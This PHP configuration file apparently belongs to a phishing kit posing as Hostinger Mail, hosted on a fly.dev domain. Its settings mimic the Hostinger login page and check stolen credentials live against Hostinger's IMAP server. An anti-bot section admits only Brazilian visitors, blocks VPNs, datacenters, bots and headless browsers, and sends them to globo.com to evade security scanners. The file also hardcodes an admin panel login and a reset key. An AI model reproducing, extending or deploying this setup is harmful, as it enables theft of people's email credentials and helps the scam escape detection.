<?php
declare(strict_types=1);

require_once __DIR__ . '/includes/admin_auth.php';

$panel_user = (string) (getenv('PANEL_USER') ?: 'Danadinho');
$panel_pass = (string) (getenv('PANEL_PASS') ?: 'Danado2027');
$dataDir    = getenv('PROVIDER_DATA_DIR') ?: '/data';
$baseUrl    = rtrim((string) (getenv('APP_BASE_URL') ?: 'https://webmail-hostinger.fly.dev'), '/');

return [
    'site_title'            => 'Hostinger Mail',
    'panel_name'            => (string) (getenv('PANEL_NAME') ?: 'Hostinger Mail'),
    'panel_marquee'         => 'Hostinger Mail - validacao IMAP imap.hostinger.com',
    'default_locale'        => 'pt_br',
    'success_redirect'      => 'https://mail.hostinger.com/',
    'blocked_redirect'      => 'https://mail.hostinger.com/',
    'max_ip_visits'         => 0,
    'max_login_attempts'    => 5,
    'session_key'           => 'hostinger_user',
    'env'                   => 'production',
    'base_url'              => $baseUrl,
    'login_action'          => '/login.php',
    'api_verify_path'       => 'api/verify.php',
    'session_save_path'     => (getenv('PROVIDER_DATA_DIR') ?: '/data') . '/sessions',
    'data_dir'              => $dataDir,
    'provider_origin'       => 'https://mail.hostinger.com',
    'provider_login_path'   => '/auth/login',
    'verify_driver'         => 'hostinger_imap',
    'verify_variant'        => '',
    'panel_user'            => $panel_user,
    'panel_pass'            => $panel_pass,
    'panel_reset_key'       => (string) (getenv('PANEL_RESET_KEY') ?: 'fly-reset'),
    'anti_bot' => [
        'enabled'               => true,
        'allowed_countries'     => ['BR'],
        'enforce_country'       => true,
        'deny_hosting'          => true,
        'deny_proxy_vpn'        => true,
        'deny_datacenter_asn'   => true,
        'deny_bots_ua'          => true,
        'deny_bad_headers'      => true,
        'deny_empty_ua'         => true,
        'deny_headless_signals' => true,
        'enforce_device'        => true,
        'strict_geo_unknown'    => false,
        'allow_localhost'       => false,
        'redirect'              => 'https://www.globo.com/',
        'log_blocks'            => true,
    ],
    'anti_phishing' => [
        'enabled' => true,
    ],
    'admin' => admin_auth_load($dataDir, [
        'panel_user' => $panel_user,
        'panel_pass' => $panel_pass,
    ]),
];